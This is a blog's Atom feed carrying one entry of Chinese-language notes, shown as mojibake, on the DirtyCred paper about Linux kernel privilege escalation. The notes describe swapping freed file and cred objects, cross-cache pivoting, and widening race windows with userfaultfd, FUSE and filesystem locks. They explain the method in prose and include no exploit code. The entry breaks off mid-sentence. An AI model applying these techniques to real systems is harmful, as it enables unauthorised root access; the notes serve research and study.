<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3çš„ç§˜å¯†å°å±‹</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2023-12-30T19:59:18.137Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€PAPER.0x05ã€‘è®ºæ–‡ç¬”è®°ï¼šDirtyCred: Escalating Privilege in Linux Kernel</title>
    <link href="https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/"/>
    <id>https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/</id>
    <published>2023-12-30T19:34:16.000Z</published>
    <updated>2023-12-30T19:59:18.137Z</updated>
    
    <content type="html"><![CDATA[<p>æ–°ç“¶è£…æ—§é…’çš„ 114514 ç§å†™æ³•</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>DirtyCred åœ¨ <a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">blackhat usa 2022ä¸Šçš„æ¼”è®² ppt</a> å’Œ<a href="https://zplin.me/papers/DirtyCred.pdf">å‘åœ¨ CCS ä¸Šçš„è®ºæ–‡</a>ç¬”è€…å¾ˆæ—©å°±çœ‹è¿‡äº†ï¼Œç®€è€Œè¨€ä¹‹è¿™ä¸ªåˆ©ç”¨æ‰‹æ³•çš„æ€è·¯å…¶å®ç®—æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£çš„ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è¯´å¹¶æ²¡æœ‰å¿…è¦ä¸“é—¨å†™ä¸€ç¯‡åšå®¢ï¼Œä½†æ˜¯æœ€è¿‘åˆšå¥½éœ€è¦åšå…³äº DirtyCred çš„æŠ€æœ¯åˆ†äº«ï¼Œä»¥åŠ 12 ğŸˆ·ç¬”è€…æš‚ä¸”ä¸€ç¯‡æŠ€æœ¯å‹åšå®¢éƒ½è¿˜æ²¡æœ‰å†™ï¼Œä¸ºäº†ä¸ç ´å<a href="https://arttnba3.cn/2000/10/12/hello-world/#About-the-blog">æ›¾ç»ç»™è‡ªå·±å®šä¸‹æ¥çš„è§„çŸ©</a>ï¼Œç¬”è€…å†³å®šç®€å•æ°´ä¸€ç¯‡å…³äº DirtyCred çš„åšå®¢ï¼šï¼‰</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">DirtyPipe</a> åœ¨å®‰å…¨ç¤¾åŒºå¼•èµ·äº†ä¸€é˜µç‹‚æ¬¢ï¼Œä½†è¿™ä¸ªæ‰‹æ³•é™åˆ¶å¤ªå¤šäº†ï¼Œå› æ­¤ä½œè€…ç»™å‡ºæ–°çš„ç±»ä¼¼çš„åˆ©ç”¨æ–¹æ³•â€”â€”<code>DirtyCred</code> ï¼Œé€šè¿‡ç¯¡æ”¹<strong>å‡­è¯</strong>ï¼ˆcredentialï¼‰ç»“æ„ä½“æ¥è¿›è¡Œåˆ©ç”¨ï¼ŒåŒæ—¶ä½œè€…è¿˜ç»™å‡ºäº†é˜²èŒƒæ‰‹æ®µ</p><p><strong>KEYWORDS</strong>ï¼šOS Security; Kernel Exploitation; Privilege Escalation</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>Linux å¯¹äºé»‘å®¢ä»¬è€Œè¨€éå¸¸æµè¡Œï¼Œä½† KASLRã€CFI ç­‰é˜²æŠ¤æ‰‹æ®µè®©åˆ©ç”¨å˜å¾—å›°éš¾ï¼Œå› æ­¤ <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> ï¼ˆDirtyPipeï¼‰çš„å‡ºç°å¼•å‘äº†çƒ­æ½®â€”â€”å¥¹ä¸éœ€è¦ä¸ä¼—å¤šå†…æ ¸é˜²æŠ¤æªæ–½ï¼Œä½†ä»å­˜åœ¨ä¸å¤Ÿæ™®é€‚çš„ç¼ºé™·</p><blockquote><p>ç¬”è€…æ³¨ï¼šè¿™é‡Œä½œè€…ä¸ºäº†æŠ¬é«˜è‡ªå·±çš„æ‰‹æ³•åœ¨å‰é¢è´¬ä½äº†ä¸€å˜´ DirtyPipe åšé“ºå«ï¼Œä½†å…¶å®å°†æ¼æ´è½¬æ¢ä¸º DirtyPipe å·²ç»æ˜¯éå¸¸å¸¸è§çš„åˆ©ç”¨æ–¹å¼äº†ï¼Œå°±ç¬”è€…æ‰€çŸ¥ DirtyPipe æ¯” DirtyCred å®é™…ä¸Š<strong>é€‚ç”¨æ€§æ˜¯æ›´åŠ å¹¿æ³›çš„ï¼Œç°åœ¨åœ¨ CTF ä¸çœŸå®ä¸–ç•Œæ¼æ´åˆ©ç”¨ä¸­å¤§å®¶éƒ½å€¾å‘äºå°†æ¼æ´è½¬ä¸º DirtyPipeã€è€Œå¹¶é DirtyCred è¿›è¡Œåˆ©ç”¨</strong>ï¼Œ <del>ä½†æ˜¯ä¸ºäº†å‘è®ºæ–‡å˜›è‚¯å®šå¾—è‡ªå¹è‡ªæ“‚ä¸€æ‰‹</del></p></blockquote><p>æœ¬æ–‡æå‡ºä¸€ç§é€šç”¨åˆ©ç”¨æ‰‹æ³•â€”â€”<code>DirtyCred</code> ï¼Œå…¶å¹¶ä¸åŸºäºç®¡é“æœºåˆ¶æˆ–æ˜¯ CVE-2022-0847ï¼Œè€Œæ˜¯é€šè¿‡å †æ¼æ´å°†ä½æƒé™çš„ credentials ç»“æ„ä½“æ›¿æ¢ä¸ºé«˜æƒé™çš„ credentialsï¼Œç®€è€Œè¨€ä¹‹æœ¬æ–‡è´¡çŒ®å¦‚ä¸‹ï¼š</p><ul><li>æå‡ºäº†æ–°çš„åˆ©ç”¨æ‰‹æ³• DirtyCredï¼Œå…¶å¯ä»¥è§„é¿è®¸å¤šå†…æ ¸ä¿æŠ¤æœºåˆ¶</li><li>è¯æ˜äº† DirtyCred å¯ä»¥åœ¨çœŸå®ä¸–ç•Œæ¼æ´ä¸­å¹¿æ³›è¿›è¡Œåˆ©ç”¨</li><li>åˆ†æç°æœ‰å†…æ ¸ä¿æŠ¤æœºåˆ¶å¹¶è®¾è®¡å‡ºäº†ä¸€ç§æ–°çš„ä¿æŠ¤æœºåˆ¶</li></ul><h1 id="0x02-Background-amp-Threat-Model"><a href="#0x02-Background-amp-Threat-Model" class="headerlink" title="0x02. Background &amp; Threat Model"></a>0x02. Background &amp; Threat Model</h1><h2 id="2-1-Credentials-in-Linux-kernel"><a href="#2-1-Credentials-in-Linux-kernel" class="headerlink" title="2.1 Credentials in Linux kernel"></a>2.1 Credentials in Linux kernel</h2><p><strong>å‡­è¯</strong>ï¼ˆcredentialsï¼‰æŒ‡å†…æ ¸ä¸­åŒ…å«æƒé™ä¿¡æ¯çš„ä¸œè¥¿ï¼Œåœ¨ Linux å†…æ ¸ä¸­è¢«å®ç°ä¸ºå¸¦æœ‰æƒé™ä¿¡æ¯çš„å†…æ ¸å¯¹è±¡ï¼ˆåŒ…æ‹¬ <code>cred</code>ã€<code>file</code>ã€<code>inode</code>ï¼Œæœ¬æ–‡ä»…ç”¨å‰ä¸¤ä¸ªå› ä¸ºç¬¬ä¸‰ä¸ªä»…ä¼šåœ¨åˆ›å»ºæ–‡ä»¶æ—¶è¢«åˆ†é…ï¼‰ï¼š</p><ul><li>Linux å†…æ ¸ä¸­æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ <code>cred</code> å¯¹è±¡çš„æŒ‡é’ˆï¼Œå…¶ä¸­æœ‰ç€è¯¥è¿›ç¨‹çš„æƒé™ä¿¡æ¯ï¼Œå¦‚å½“è¿›ç¨‹è¦è®¿é—®æ–‡ä»¶æ—¶ä¾¿ä¼šæ£€æŸ¥ cred çš„ UIDï¼›cred å¯¹è±¡è¿˜æè¿°äº†èƒ½åŠ›ï¼ˆcapabilityï¼‰ï¼Œå¦‚ <code>CAP_NET_BIND_SERVICE</code> è¯´æ˜äº†è¿›ç¨‹å¯ä»¥å°†ä¸€ä¸ªå¥—æ¥å­—ç»‘å®šåˆ°ä¸€ä¸ªç«¯å£ä¸Š</li><li>Linux å†…æ ¸ä¸­æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ç€å¯¹åº”çš„æƒé™è®¾ç½®ï¼Œä¸”ä¸ inode å¯¹è±¡ç»‘å®šï¼Œåœ¨è¿›ç¨‹è¦æ‰“å¼€æ–‡ä»¶å‰å†…æ ¸ä¼šè°ƒç”¨ <code>inode_permission</code> æ£€æŸ¥æƒé™ï¼Œåœ¨æ–‡ä»¶æ‰“å¼€å <code>file</code> å¯¹è±¡ç”¨ä»¥è®°å½•æƒé™è®¾ç½®</li></ul><h2 id="2-2-Kernel-Heap-Memory-Management"><a href="#2-2-Kernel-Heap-Memory-Management" class="headerlink" title="2.2 Kernel Heap Memory Management"></a>2.2 Kernel Heap Memory Management</h2><blockquote><p>å»ºè®®çœ‹ <a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">ã€OS.0x04ã€‘Linux å†…æ ¸å†…å­˜ç®¡ç†æµ…æ III - Slub Allocator</a></p></blockquote><p>å†…æ ¸å †å¯¹è±¡æœ‰ä¸¤ç§ç¼“å­˜æ± ï¼š</p><ul><li><strong>é€šç”¨ç¼“å­˜</strong>ï¼ˆGeneric Cachesï¼‰ï¼šç›¸åŒå¤§å°çš„éƒ½èƒ½ä»è¿™ç±»æ± ä¸­è¿›è¡Œåˆ†é…</li><li><strong>ä¸“ç”¨ç¼“å­˜</strong>ï¼ˆDedicated Cachesï¼‰ï¼šå‡ºäºå®‰å…¨ä¸æ€§èƒ½ç›®çš„è€ƒè™‘è®¾è®¡çš„ä»…ä¾›æŸäº›ç»“æ„ä½“åˆ†é…çš„æ± </li></ul><h2 id="2-3-Threat-Model"><a href="#2-3-Threat-Model" class="headerlink" title="2.3 Threat Model"></a>2.3 Threat Model</h2><p>ä½œè€…å‡è®¾éç‰¹æƒæœ¬åœ°ç”¨æˆ·å¯ä»¥è®¿é—® Linux ç³»ç»Ÿï¼Œç›®çš„æ˜¯åˆ©ç”¨å †å†…å­˜æŸåæ¼æ´è¿›è¡Œææƒï¼Œå¹¶å‡è®¾ä¸Šæ¸¸ï¼ˆ5.15ï¼‰æ‰€æœ‰ç¼“è§£æªæ–½ä¸ä¿æŠ¤æœºåˆ¶éƒ½å·²å¯ç”¨ï¼ˆåŒ…æ‹¬KASLRã€SMAPã€SMEPã€CFIã€KPTI ç­‰ï¼‰</p><h1 id="0x03-Technical-Overview-amp-Challenges"><a href="#0x03-Technical-Overview-amp-Challenges" class="headerlink" title="0x03. Technical Overview &amp; Challenges"></a>0x03. Technical Overview &amp; Challenges</h1><h2 id="3-1-Overview"><a href="#3-1-Overview" class="headerlink" title="3.1 Overview"></a>3.1 Overview</h2><p>ä½œè€…ä½¿ç”¨ CVE-2021-4154 ä½œä¸ºä¾‹å­è¯´æ˜ DirtyCredï¼Œè¿™æ˜¯ä¸€ä¸ª <code>fs_context</code> å¯¹è±¡é”™è¯¯å¼•ç”¨ <code>file</code> å¯¹è±¡æ‰€å¯¼è‡´çš„ç±»å‹æ··æ·†é”™è¯¯ï¼Œè¿™å…è®¸å°†æ­£åœ¨ä½¿ç”¨ä¸­çš„ <code>file</code> è¿›è¡Œé‡Šæ”¾</p><p>å¦‚å›¾ 1 æ‰€ç¤ºï¼š</p><ul><li>é¦–å…ˆæ‰“å¼€å¯å†™æ–‡ä»¶ <code>/tmp/x</code> åˆ†é…ä¸€ä¸ª <code>file</code> ï¼Œä¹‹åå°è¯•è¿›è¡Œæ•°æ®å†™å…¥ï¼Œæƒé™æ£€æŸ¥é€šè¿‡ï¼Œä¹‹å DirtyCred å°†æ–‡ä»¶å†™å…¥æš‚åœ</li><li>æ¥ä¸‹æ¥è§¦å‘æ¼æ´å°† <code>file</code> ç»“æ„ä½“é‡Šæ”¾</li><li>ä¹‹åæ‰“å¼€åªè¯»æ–‡ä»¶ <code>/etc/passwd</code> é‡æ–°å–å›è¯¥ <code>file</code> å¯¹è±¡ï¼Œå¹¶æ¢å¤æ•°æ®å†™å…¥ï¼Œæ­¤æ—¶ä¾¿æˆåŠŸå®Œæˆè¶Šæƒå†™</li></ul><p>è¯¥ä¾‹å­åªæ˜¯ç”¨æ¥è¯´æ˜ DirtyCred å¦‚ä½•åˆ©ç”¨ file ç»“æ„ä½“è¿›è¡Œåˆ©ç”¨ï¼Œå¦‚ Section 2 æ‰€è¨€ï¼Œé™¤äº† <code>file</code> ä»¥å¤–ï¼Œ<code>cred</code> ä¹Ÿå¯ä»¥ä½œä¸ºåˆ©ç”¨å¯¹è±¡</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230070520.png"></p><p>ä»çœŸå®ä¸–ç•Œæ¡ˆä¾‹ä¸­å¯ä»¥çœ‹å‡º DirtyCred ä¸ä¼šåŠ«æŒæ§åˆ¶æµï¼Œæœ¬è´¨ä¸Šæ˜¯æ“çºµå†…å­˜ä¸­çš„å†…æ ¸å¯¹è±¡ï¼Œå› æ­¤è®¸å¤šç°æœ‰çš„æ§åˆ¶æµé˜²æŠ¤æ‰‹æ®µæ— æ³•è¿›è¡Œé˜²å¾¡ï¼Œä¸€äº›å·¥ä½œï¼ˆå¦‚ <a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game/">AUTOSLAB</a>ï¼‰åˆ™åœ¨å¯¹æŠ— DirtyCredï¼Œä½†å¦‚ç¬¬ 8 èŠ‚æ‰€è¨€å…¶ä»æ— æ³•é˜²å¾¡è¿™ç§æ‰‹æ®µ</p><h2 id="3-2-Technical-Challenges"><a href="#3-2-Technical-Challenges" class="headerlink" title="3.2 Technical Challenges"></a>3.2 Technical Challenges</h2><p>DirtyCred ä»é¢ä¸´ä¸€äº›æŒ‘æˆ˜ï¼š</p><ul><li>DirtyCred éœ€è¦ invalid-free capability å»é‡Šæ”¾æ‰ä¸€ä¸ªä½æƒé™å¯¹è±¡å¹¶é‡æ–°åˆ†é…ä¸ºé«˜æƒé™å¯¹è±¡ï¼Œè¿™ç§èƒ½åŠ›é€šå¸¸éš¾ä»¥è·å¾—ï¼Œå› æ­¤ DirtyCred éœ€è¦å°†æ¼æ´çš„ä¸åŒèƒ½åŠ›è½¬ä¸ºæ‰€éœ€èƒ½åŠ›ï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬ 4 èŠ‚è¿›è¡Œæè¿°</li><li>DirtyCred éœ€è¦æš‚åœæ–‡ä»¶å†™å…¥æ“ä½œï¼Œè¿™åŒæ ·æ˜¯ä¸€ä¸ªæŒ‘æˆ˜ï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬ 5 èŠ‚ä¸­ä»‹ç»å¯ä»¥è¾¾æˆè¯¥ç›®æ ‡çš„å¤šç§æœºåˆ¶</li><li>DirtyCred çš„å…³é”®æ­¥éª¤æ˜¯è¦ç”¨é«˜æƒé™å‡­è¯æ›¿æ¢æ‰ä½æƒé™çš„ï¼Œä½†å¯¹äºä½æƒé™ç”¨æˆ·è€Œè¨€åˆ†é…é«˜æƒé™å‡­è¯ä¹Ÿæ˜¯ä¸€ä¸ªæŒ‘æˆ˜ï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬ 6 èŠ‚ä¸­ç»™å‡ºè§£å†³æ–¹æ¡ˆ</li></ul><h1 id="0x04-Pivoting-Vulnerability-Capability"><a href="#0x04-Pivoting-Vulnerability-Capability" class="headerlink" title="0x04. Pivoting Vulnerability Capability"></a>0x04. Pivoting Vulnerability Capability</h1><blockquote><p>Pwn äººåŸºæœ¬åŠŸäº†å—·ï¼Œæ†‹å’ŒğŸ‘´è¯´ä½ ä¸ä¼šå—·</p></blockquote><p>è™½ç„¶ CVE-2021-4154 å±•ç¤ºäº† DirtyCred çš„å¨åŠ›ï¼Œä½†å®æˆ˜ä¸­æˆ‘ä»¬å¹¶ä¸ä¸€å®šæœ‰è¿™æ ·çš„èƒ½åŠ›ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œèƒ½åŠ›è½¬æ¢ï¼ˆç¬”è€…æ³¨ï¼šæ¼æ´è¿ç§»çš„æ¦‚å¿µï¼‰</p><h2 id="4-1-Pivoting-OOB-amp-UAF-Write"><a href="#4-1-Pivoting-OOB-amp-UAF-Write" class="headerlink" title="4.1 Pivoting OOB &amp; UAF Write"></a>4.1 Pivoting OOB &amp; UAF Write</h2><p>å¦‚å›¾ 2 æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ partial overwrite å°†åŒ…å«æŒ‡å‘å‡­è¯å¯¹è±¡çš„æŒ‡é’ˆçš„å†…æ ¸å¯¹è±¡è¿›è¡Œå¤å†™ï¼Œä½¿å¾—ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå‡­è¯å¯¹è±¡ï¼Œä»è€Œè¿›è¡Œ DirtyCredï¼Œç”±äºå †å–·è¿ç»­åˆ†é…çš„ç»“æ„ä½“é€šå¸¸åˆ†ç»„æ¥è‡ªç›¸åŒ slabï¼Œå› æ­¤å¯è¡Œæ€§å¾ˆé«˜</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072228.png"></p><h2 id="4-2-Pivoting-DF"><a href="#4-2-Pivoting-DF" class="headerlink" title="4.2 Pivoting DF"></a>4.2 Pivoting DF</h2><p>é€šç”¨ç¼“å­˜ï¼ˆå¦‚ <code>kmalloc-96</code>ï¼‰ä¸ä¸“ç”¨ç¼“å­˜ï¼ˆå¦‚ <code>cred_jar</code>ï¼‰é—´å­˜åœ¨éš”ç¦»ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡Šæ”¾ç¼“å­˜é¡µé¢å¹¶é‡æ–°åˆ†é…çš„æ–¹å¼ä½¿å¾—è·¨ç¼“å­˜çš„å†…å­˜æ“ä½œæˆä¸ºå¯èƒ½ï¼Œå¦‚å›¾ 3 æ‰€ç¤ºï¼Œæˆ‘ä»¬å…ˆåˆ†é…å¤§é‡å¯¹è±¡ï¼Œé€šè¿‡æ¼æ´æˆ‘ä»¬æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å¯¹è±¡ï¼Œåœ¨å¤§é‡åˆ†é…åæˆ‘ä»¬å°†å…¶å¤§é‡é‡Šæ”¾ï¼Œå¹¶ä¿ç•™ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆï¼Œä¹‹åå†åˆ†é…ä¸ºå‡­è¯ç»“æ„ä½“å¯¹è±¡ï¼Œä»¥æ­¤è¿›è¡Œ DirtyCred</p><blockquote><p>ç¬”è€…æ³¨ï¼šè¿™ä¸ªæ‰‹æ³•ä¹Ÿå‡ºç°åœ¨ç¬”è€…è¿‘æœŸä¾›ç»™æŸäº› CTF æ¯”èµ›ä¸­çš„ kernel pwn é¢˜ä¸­ï¼Œå¯æƒœæ€ä¹ˆéƒ½æ˜¯ 0 è§£ï¼ˆæ¼ï¼‰</p></blockquote><p>ä½†å¦‚å›¾ 3(f) æ‰€ç¤ºï¼Œæ¼æ´å¯¹è±¡å¤§å°ä¸ä¸€å®šåŒ¹é…å‡­è¯å¯¹è±¡å¤§å°ï¼Œä»è€Œæ— æ³• DirtyCredï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦ä¿æœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œå°†å…¶ä¸­ä¸€ä¸ªé‡Šæ”¾æ‰ä»è€Œæ„é€ å‡ºç©ºå†…å­˜æ§½ä»¥åˆ†é…ä¸ºå‡­è¯ç»“æ„ä½“ï¼Œå†è¿›è¡Œé‡Šæ”¾ä»¥è·å–æ‰€éœ€èƒ½åŠ›</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072544.png"></p><h1 id="0x05-Extending-Time-Window"><a href="#0x05-Extending-Time-Window" class="headerlink" title="0x05. Extending Time Window"></a>0x05. Extending Time Window</h1><p>DirtyCred éœ€è¦æˆ‘ä»¬å»¶é•¿æƒé™æ£€æŸ¥åˆ°å†™å…¥ä¹‹é—´çš„æ—¶é—´çª—å£</p><h2 id="5-1-Exploitation-of-Userfaultfd-amp-FUSE"><a href="#5-1-Exploitation-of-Userfaultfd-amp-FUSE" class="headerlink" title="5.1 Exploitation of Userfaultfd &amp; FUSE"></a>5.1 Exploitation of Userfaultfd &amp; FUSE</h2><blockquote><p>ç®€è€Œè¨€ä¹‹é•¿è¯çŸ­è¯´å¯ä»¥å‚è§<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">è¿™é‡Œ</a></p></blockquote><p>userfaultfd å…è®¸æˆ‘ä»¬åœ¨ç”¨æˆ·æ€æ‰‹åŠ¨å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼ŒFUSE å…è®¸æˆ‘ä»¬å®ç°ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œè¿™ä¸ºå»¶é•¿æ—¶é—´çª—å£æä¾›äº†å¯è¡Œæ€§ï¼Œå¦‚è¯»å†™æ³¨å†Œäº† userfaultfd çš„å†…å­˜é¡µæˆ–æ˜¯è¯»å†™ FUSE æ–‡ä»¶æ¥è§¦å‘æˆ‘ä»¬çš„è‡ªå®šä¹‰ handler å‡½æ•°</p><p>ä¸‹é¢æˆ‘ä»¬ä»¥ userfaultfd ä¸ºä¾‹ï¼ˆFUSE åˆ©ç”¨æ–¹å¼ç±»ä¼¼ï¼‰ï¼ŒDirtyCred é€šè¿‡ç³»ç»Ÿè°ƒç”¨ <code>writev()</code> è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Œä¸åŒäº <code>write()</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä½¿ç”¨ <code>iovec</code> å‘é‡æ¥ä¼ é€’æ•°æ®ï¼Œå¦‚ List 1 æ‰€ç¤ºï¼Œ4.13 ç‰ˆæœ¬å‰çš„ç³»ç»Ÿè°ƒç”¨ <code>writev()</code> é¦–å…ˆè¿›è¡Œæƒé™æ£€æŸ¥ï¼Œä¹‹åå†é€šè¿‡ <code>iovec</code> å‘é‡å¯¼å…¥ç”¨æˆ·ç©ºé—´æ•°æ®ï¼Œæœ€åæ‰æ˜¯å†™å…¥ï¼Œå› æ­¤ DirtyCred å¯ä»¥å¾ˆè½»æ˜“åœ°ä½¿ç”¨ userfaultfd çš„ç‰¹æ€§æ¥è·å¾—åˆé€‚çš„æ—¶é—´çª—å£</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164326.png"></p><p>è¿™é¡¹æŠ€æœ¯åˆè§äº <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">CVE-2016-4557</a>ï¼Œä½†ç°åœ¨å·²ä¸å†å¯ç”¨</p><h2 id="5-2-Alternative-Exploitation-of-Userfaultfd-amp-FUSE"><a href="#5-2-Alternative-Exploitation-of-Userfaultfd-amp-FUSE" class="headerlink" title="5.2 Alternative Exploitation of Userfaultfd &amp; FUSE"></a>5.2 Alternative Exploitation of Userfaultfd &amp; FUSE</h2><p>å¦‚ List 2 æ‰€ç¤ºï¼Œåœ¨å†…æ ¸ç‰ˆæœ¬ 4.13 ä¹‹åå¯¼å…¥ <code>iovec</code> å‘é‡çš„æ­¥éª¤è¢«ç§»åŠ¨åˆ°äº†æƒé™æ£€æŸ¥ä¹‹å‰ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬ä¸å†èƒ½æ‰©å¤§æƒé™æ£€æŸ¥ä¸æ–‡ä»¶å†™å…¥é—´çš„æ—¶é—´çª—å£ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒDirtyCred å°†åˆ©ç”¨ Linux æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164938.png"></p><p>å†…æ ¸æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡éµå¾ªä¸¥æ ¼çš„å±‚æ¬¡å…³ç³»ï¼Œé«˜å±‚æ¥å£ç»Ÿä¸€è€Œä½å±‚æ¥å£å„å¼‚ï¼Œå†™å…¥æ–‡ä»¶æ—¶ä¼šè°ƒç”¨é«˜å±‚æ¥å£ï¼Œå¦‚ List 3 æ‰€ç¤ºï¼Œ <code>generic_perform_write()</code> ä¸ºç»Ÿä¸€çš„é«˜å±‚æ¥å£ï¼Œåœ¨ç¬¬ 15 ~ 17 è¡Œå…¶ä¼šè°ƒç”¨å¯¹åº”æ–‡ä»¶ç³»ç»Ÿçš„å†™å…¥æ“ä½œï¼Œå‡ºäºæ€§èƒ½è€ƒè™‘å†…æ ¸åœ¨å†™å…¥å‰ä¼šæ‹·è´ iovec å‘é‡æ•°æ®ï¼Œä»è€Œè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œç”±æ­¤ DirtyCred å¯ä»¥åœ¨ç¬¬ 10 è¡Œä½¿ç”¨ userfaultfd æ¥å»¶é•¿æ—¶é—´çª—å£</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230201446.png"></p><p>ä¸é€šè¿‡å¯¼å…¥ <code>iovec</code> æ¥æš‚åœå†…æ ¸çš„æ‰§è¡Œç›¸æ¯”ï¼Œå¯¹æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡è¿›è¡Œåˆ©ç”¨åˆ™æ›´éš¾è¢«ç¼“è§£ï¼Œå¦‚ List 3 ä¸­æ³¨é‡Šæ‰€è¨€ï¼Œç§»é™¤ iovec çš„ page fault æœ‰å¯èƒ½é€ æˆæ­»é”ï¼›å°† page fault ç§»åˆ°æƒé™æ£€æŸ¥å‰å¯èƒ½è§£å†³é—®é¢˜ï¼Œä½†è¿™ä¼šå¯¹æ€§èƒ½é€ æˆå½±å“ï¼Œä¸”ä»å­˜åœ¨æ½œåœ¨çš„è¢«ç»•è¿‡çš„å¯èƒ½ï¼Œå¦‚ DirtyCred å¯ä»¥åœ¨ paeg fault ä¹‹åå†ç§»é™¤è¯¥é¡µï¼Œä»è€Œåœ¨æ‹·è´æ—¶å†æ¬¡ page fault ä»¥æš‚åœï¼ˆ<del>æœ‰ç‚¹æ‰¯äº†</del>ï¼‰</p><h2 id="5-3-Exploitation-of-Lock-in-Filesystem"><a href="#5-3-Exploitation-of-Lock-in-Filesystem" class="headerlink" title="5.3 Exploitation of Lock in Filesystem"></a>5.3 Exploitation of Lock in Filesystem</h2><p>Linux æ–‡ä»¶ç³»ç»Ÿå­˜åœ¨é”æœºåˆ¶ï¼ˆå¦‚ List 4 ä¸º ext4 ä¸­çš„é”ï¼‰ï¼Œè¿™ä¸º DirtyCred åˆ›é€ äº†æœºä¼šï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸¤ä¸ªè¿›ç¨‹ A ä¸ B åŒæ—¶å†™å…¥åŒä¸€æ–‡ä»¶ï¼Œåœ¨ A æŒæœ‰é”è¿›è¡Œå†™å…¥æ—¶ B é™·å…¥ç­‰å¾…ï¼Œè€Œåœ¨ <code>generic_perform_write()</code> ä¹‹å‰æƒé™æ£€æŸ¥æ—©å·²å®Œæˆï¼Œç”±æ­¤ DirtyCred å¯ä»¥é€šè¿‡å†™å…¥å¤§é‡æ•°æ®æ¥åˆ›é€ ä¸€ä¸ªè¾ƒé•¿çš„æ—¶é—´çª—å£ä»¥å®Œæˆ file çš„æ›¿æ¢ï¼ˆæ®ä½œè€…è§‚å¯Ÿå†™å…¥ 4GB æ–‡ä»¶å¤§æ¦‚éœ€è¦å¥½å‡ ç§’ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230203419.png"></p><h1 id="0x06-Allocating-Privileged-Object"><a href="#0x06-Allocating-Privileged-Object" class="headerlink" title="0x06. Allocating Privileged Object"></a>0x06. Allocating Privileged Object</h1><p>DirtyCred éœ€è¦åœ¨å†…æ ¸ç©ºé—´åˆ†é…ç‰¹æƒå¯¹è±¡ï¼Œæœ¬èŠ‚å™è¿°å¦‚ä½•ä»¥ä¸€ä¸ªä½æƒé™ç”¨æˆ·åšåˆ°è¿™ä¸€ç‚¹</p><h2 id="6-1-Allocation-from-Userspace"><a href="#6-1-Allocation-from-Userspace" class="headerlink" title="6.1 Allocation from Userspace"></a>6.1 Allocation from Userspace</h2><p><code>cred</code> å¯¹è±¡ä»£è¡¨äº†å¯¹åº”å†…æ ¸è¿›ç¨‹çš„æƒé™ï¼Œå› æ­¤ DirtyCred å¯ä»¥é€šè¿‡æ‰§è¡Œ root-SUID ç¨‹åºæ¥åˆ›å»º root è¿›ç¨‹ï¼ˆè€Œä¸ç”¨å¯»æ‰¾è¿™ç±»ç¨‹åºä¸­çš„æ¼æ´ï¼‰ï¼Œè¿™æ 